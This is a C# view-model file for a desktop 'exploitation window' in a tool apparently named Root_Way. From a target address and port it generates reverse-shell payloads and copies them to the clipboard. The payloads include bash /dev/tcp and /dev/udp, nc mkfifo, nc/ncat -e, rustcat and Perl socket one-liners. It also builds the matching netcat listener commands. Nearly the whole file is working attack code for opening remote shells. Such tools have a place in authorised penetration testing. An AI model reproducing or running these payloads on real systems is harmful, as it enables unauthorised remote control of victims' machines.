using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows.Input;
using Avalonia;
using Avalonia.Controls;
using Avalonia.Input.Platform;
using ReactiveUI;

namespace Root_Way.ViewModels;

public class ExploitationWindowViewModel : ViewModelBase, IReactiveObject
{
    private string _target; 
    private ComboBoxItem _shellType;
    private string? _port;
    private ComboBoxItem _listenerType;
    private string _contentListenerType;
    private ComboBoxItem _reversePayload;
    private string _contentReversePayload;
    private string _errorMessage;

    public ICommand GenerateReverseShellCommand { get; }
    public ICommand CopyReversePayloadCommand { get; }
    public ICommand CopyListenerTypeCommand { get; }
    
    public ExploitationWindowViewModel()
    {
        GenerateReverseShellCommand = new ViewModelCommand(ExecuteGenerateReverseShellCommand);
        CopyReversePayloadCommand = new ViewModelCommand(ExecuteCopyReversePayloadCommand);
        CopyListenerTypeCommand = new ViewModelCommand(ExecuteCopyListenerTypeCommand);
    }
    public string ErrorMessage
    {
        get => _errorMessage;
        set
        {
            _errorMessage = value;
            OnPropertyChanged(nameof(ErrorMessage));
        }
    }
    public ComboBoxItem ShellType
    {
        get => _shellType;
        set
        {
            _shellType = value;
            OnPropertyChanged(nameof(ShellType));
        }
    }
    public string Target
    {
        get => _target;
        set
        {
            _target = value;
            OnPropertyChanged(nameof(Target));
        }
    }

    public string Port
    {
        get => _port;
        set
        {
            _port = value;
            OnPropertyChanged(nameof(Port));
        }
    }
    
    //COMBOBOX OF LISTENERS TYPES
    public ComboBoxItem ListenerType
    {
        get => _listenerType;
        set
        {
            _listenerType = value;
            OnPropertyChanged(nameof(ListenerType));
        }
    }
    
    public string ContentListenerType
    {
        get => _contentListenerType;
        set
        {
            _contentListenerType = value;
            OnPropertyChanged(nameof(ContentListenerType));
        }
    }
    
    //COMBOBOX OF REVERSE PAYLOADS
    public ComboBoxItem ReversePayload
    {
        get => _reversePayload;
        set
        {
            _reversePayload = value;
            OnPropertyChanged(nameof(ReversePayload));
        }
    }
    
    public string ContentReversePayload
    {
        get => _contentReversePayload;
        set
        {
            _contentReversePayload = value;
            OnPropertyChanged(nameof(ContentReversePayload));
        }
    }
    
    private void ExecuteGenerateReverseShellCommand(object obj)
    {
        string target = Target;
        string? port = Port; 
        ComboBoxItem shellType = ShellType;

        //PORTS
        if (string.IsNullOrEmpty(Port) || string.IsNullOrEmpty(Target))
        {
            ErrorMessage = "ERROR, Target or Port missing";
            return;
        }
        else
            ErrorMessage = " ";
        
        //CONTENT COMBOBOX OF LISTENERS TYPES
        switch (ListenerType.Content)
        {
            case "nc":
                ContentListenerType = "nc -lvnp " + port;
                break;

            case "nc freebsd":
                ContentListenerType = "nc -lvn " + port;
                    
                break;
                
            case "busybox nc":
                ContentListenerType = "busybox nc -lp " + port;
                    
                break;

            case "ncat":
                ContentListenerType = "ncat.exe -lvnp " + port;
                    
                break;

            default:
                ContentListenerType = "nc -lvnp " + port;
                break;
        }
        
        //CONTENT COMBOBOX OF REVERSE PAYLOADS
        switch (ReversePayload.Content)
        {
            case "Bash -i":
                ContentReversePayload = string.Format("{2} -i >& /dev/tcp/{0}/{1} 0>&1", target, port, shellType.Content);
                break;

            case "Bash 196":
                ContentReversePayload = string.Format("0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196", target, port, shellType.Content);
                break;
                
            case "Bash read line":
                ContentReversePayload = string.Format("exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done", target, port);
                break;

            case "Bash 5":
                ContentReversePayload = string.Format("{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5", target, port, shellType.Content);
                break;
            
            case "Bash udp":
                ContentReversePayload = string.Format("{2} -i >& /dev/udp/{0}/{1} 0>&1", target, port, shellType.Content);
                break;
            
            case "nc mkfifo":
                ContentReversePayload = string.Format("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{2} -i 2>&1|nc {0} {1} >/tmp/f", target, port, shellType.Content);
                break;
            
            case "nc -e":
                ContentReversePayload = string.Format("nc {0} {1} -e {2}", target, port, shellType.Content);
                break;
            
            case "nc.exe -e":
                ContentReversePayload = string.Format("nc.exe {0} {1} -e {2}", target, port, shellType.Content);
                break;
            
            case "BusyBox nc -e":
                ContentReversePayload = string.Format("busybox nc {0} {1} -e {2}", target, port, shellType.Content);
                break;
            
            case "nc -c":
                ContentReversePayload = string.Format("nc -c {2} {0} {1}", target, port, shellType.Content);
                break;
            
            case "ncat -e":
                ContentReversePayload = string.Format("ncat {0} {1} -e {2}", target, port, shellType.Content);
                break;
            
            case "ncat.exe -e":
                ContentReversePayload = string.Format("ncat.exe {0} {1} -e {2}", target, port, shellType.Content);
                break;
            
            case "ncat udp":
                ContentReversePayload = string.Format("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{2} -i 2>&1|ncat -u {0} {1} >/tmp/f", target, port, shellType.Content);
                break;
            
            case "rustcat":
                ContentReversePayload = string.Format("rcat {0} {1} -r {2}", target, port, shellType.Content);
                break;
            
            case "Perl":
                ContentReversePayload = string.Format("perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{2} -i\");}};'", target, port, shellType.Content);
                break;
            
            case "Perl no sh":
                ContentReversePayload = string.Format("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{0}:{1}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", target, port);
                break;

            default:
                ContentReversePayload = string.Format("sh -i >& /dev/tcp/{0}/{1} 0>&1", target, port);
                break;
        }
        
    }

    private void ExecuteCopyReversePayloadCommand(object obj)
    {
        CopyTextToClipboard(ContentReversePayload);
    }
    
    private void ExecuteCopyListenerTypeCommand(object obj)
    {
        CopyTextToClipboard(ContentListenerType);
    }

    public void CopyTextToClipboard(string textBlock)
    {
        if (textBlock != null && !string.IsNullOrEmpty(textBlock))
        {
            var clipboard = AvaloniaLocator.Current.GetService<IClipboard>();
            clipboard.SetTextAsync(textBlock);
        }
    }
    


    public event PropertyChangingEventHandler? PropertyChanging;
    public void RaisePropertyChanging(PropertyChangingEventArgs args)
    {
        throw new System.NotImplementedException();
    }

    public void RaisePropertyChanged(PropertyChangedEventArgs args)
    {
        throw new System.NotImplementedException();
    }
}